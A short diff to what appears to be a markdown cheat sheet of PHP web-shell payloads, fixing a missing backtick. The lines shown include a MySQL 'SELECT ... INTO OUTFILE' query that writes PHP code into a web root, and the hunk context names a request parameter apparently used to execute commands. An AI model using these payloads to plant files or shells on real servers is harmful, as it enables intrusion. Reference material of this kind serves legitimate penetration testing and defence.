@@ -15,4 +15,4 @@ if (isset($_REQUEST['fexec'])) {
 `<?php echo $_SERVER["REMOTE_ADDR"];`
 
 ### MySQL
-`SELECT "<?phpinfo()" into OUTFILE "/var/www/html/infox.php"
+`SELECT "<?phpinfo()" into OUTFILE "/var/www/html/infox.php"`
